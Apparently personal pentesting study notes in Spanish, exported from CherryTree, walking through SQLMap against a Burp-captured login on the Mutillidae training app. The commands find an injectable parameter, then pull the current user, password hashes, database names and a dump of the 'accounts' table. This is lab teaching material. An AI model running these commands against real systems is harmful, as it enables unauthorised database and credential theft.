<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SQLMap</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SQLMap</h1><br/><p></p><p>Es una herramienta de terminal que viene instalada por defecto en Kali.</p><p></p><p>Como parámetros podemos pasarle URL pero también peticiones interceptadas de <a href="Explotación_de_vulnerabilidades--Explotación_de_aplicaciones_web--BurpSuite_118.html">BurpSuite</a>.</p><p></p><p>Capturamos un inicio de sesión y lo guardamos a un archivo:</p><p></p><p><img src="images/123-1.png" alt="images/123-1.png" /></p><p></p><p>Lo que va a hacer SQL Map es ejecutar todas las consultas SQL inyección necesarias para tratar de obtener información de la base de datos.</p><p></p><p>Lo primero que vamos a hacer va a ser ponerle esta petición y que encuentre los puntos de inyección que tiene en este caso</p><p></p><p><div class="codebox"><pre><br />sqlmap --flush-session -r Desktop<span style="color:#000000;font-weight:700">/</span>captura.burp.txt</pre></div></p><p></p><p><img src="images/123-2.png" alt="images/123-2.png" /></p><p></p><p>Pregunta que si debe seguir la re-dirección, le indicamos que no, que siga probando parámetros en la misma.</p><p></p><p><img src="images/123-3.png" alt="images/123-3.png" /></p><p>Indica que parece haber encontrado el tipo de base de datos por lo que le podemos indicar que compruebe o verifique de nuevo o que directamente salte.</p><p></p><p><img src="images/123-4.png" alt="images/123-4.png" /></p><p></p><p>Pregunta si queremos análisis más intrusivos o más extensos.</p><p></p><p>Una vez sabemos algún parámetro inyectable podemos centrar el ataque.</p><p></p><p><div class="codebox"><pre><br />sqlmap -r Desktop<span style="color:#000000;font-weight:700">/</span>captura.burp.txt --ignore-redirects --technique B -p username --current-user<br /></pre></div></p><p></p><p>Tras un rato podemos tener el nombre del usuario como veíamos antes pero de forma automática:</p><p></p><p><img src="images/123-5.png" alt="images/123-5.png" /></p><p></p><p><div class="codebox"><pre><br />sqlmap -r Desktop<span style="color:#000000;font-weight:700">/</span>captura.burp.txt --ignore-redirects --batch --technique B -p username -U root@localhost --passwords</pre></div></p><p></p><p><img src="images/123-6.png" alt="images/123-6.png" /></p><p></p><p>Podemos obtener otras cosas como nombre de la base de datos</p><p></p><p><div class="codebox"><pre><br />sqlmap -r Desktop<span style="color:#000000;font-weight:700">/</span>captura.burp.txt --ignore-redirects --batch --dbs -v 3</pre></div></p><p></p><p><img src="images/123-7.png" alt="images/123-7.png" /></p><p></p><p>Sabiendo los nombres podemos hacer un dump:</p><p></p><p><div class="codebox"><pre><br />sqlmap -r Desktop<span style="color:#000000;font-weight:700">/</span>captura.burp.txt --ignore-redirects --batch --dump -D mutillidae</pre></div></p><p></p><p>Obtenemos las tablas </p><p></p><p><img src="images/123-8.png" alt="images/123-8.png" /></p><p></p><p><div class="codebox"><pre><br />sqlmap -r Desktop<span style="color:#000000;font-weight:700">/</span>captura.burp.txt --ignore-redirects --batch --dump -T accounts -D mutillidae</pre></div></p><p></p><p><img src="images/123-9.png" alt="images/123-9.png" /></p><p></p><p>Saca las columnas y posteriormente comienza a sacar todos los datos de la tabla pero tarda un rato porque va letra a letra.</p></div>
</body>
</html>
